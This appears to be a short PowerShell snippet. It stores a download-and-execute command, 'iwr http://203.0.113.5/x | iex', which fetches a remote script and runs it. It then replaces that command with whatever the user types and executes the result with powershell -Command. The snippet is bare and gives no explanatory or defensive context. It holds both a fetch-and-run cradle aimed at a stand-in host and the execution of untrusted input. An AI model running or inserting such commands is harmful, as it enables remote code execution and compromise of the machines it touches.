$c = "iwr http://203.0.113.5/x | iex"
Read-Host | Set-Variable c
powershell -Command $c
